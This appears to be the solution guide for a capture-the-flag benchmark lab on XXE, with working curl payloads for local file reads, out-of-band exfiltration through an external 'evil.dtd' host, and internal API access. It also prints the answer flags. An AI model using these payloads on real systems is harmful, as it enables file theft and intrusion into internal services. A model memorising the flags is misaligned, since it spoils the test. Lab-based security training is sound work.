# S7BEN-VHARD-007: XXE Testing Guide

## Prerequisites
- curl, Java XML knowledge, Docker
- Estimated time: 45-75 minutes

## Setup

```bash
cd benchmarks/S7BEN-VHARD-007
docker compose up -d
sleep 30 && docker compose ps
```

## Phase 1: Basic XXE - File Read

Test basic XXE to read local files:

```bash
# Read /etc/hostname
curl -X POST http://localhost:8080/api/xml/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<data>&xxe;</data>'
```

**Expected:** Returns hostname in parsed data

## Phase 2: Read Flag File

```bash
# Read flag from /app/flag.txt
curl -X POST http://localhost:8080/api/xml/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<data>&xxe;</data>'
```

**Flag 1:** `S7BEN{xxe_external_entity_file_read_a1b2c3}`

## Phase 3: Out-of-Band XXE

Use external DTD for OOB exfiltration:

```bash
# This triggers DTD server to log exfiltrated data
curl -X POST http://localhost:8080/api/xml/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://dtd-server:8888/evil.dtd">
  %dtd;
]>
<data>trigger</data>'
```

Check DTD server logs:
```bash
docker compose logs dtd-server | grep "data="
```

**Flag 3:** `S7BEN{xxe_out_of_band_exfiltration_g7h8i9}` (from logs)

## Phase 4: Internal API Access

Access internal-api via XXE:

```bash
# Read from internal service
curl -X POST http://localhost:8080/api/xml/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-api:5000/secrets">]>
<data>&xxe;</data>'
```

**Flag 2:** `S7BEN{xxe_internal_api_access_d4e5f6}`

## Verification

```bash
# Check all flags created
docker compose exec web-app cat /app/flag.txt
docker compose exec internal-api cat /data/internal_flag.txt
docker compose logs dtd-server | tail -20
```

## Success Criteria

- ✅ Read local files via XXE
- ✅ Retrieved Flag 1 from /app/flag.txt
- ✅ OOB exfiltration working (DTD logs show data)
- ✅ Retrieved Flag 3 from DTD server logs
- ✅ Accessed internal-api via XXE
- ✅ Retrieved Flag 2 from internal service

## References

- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
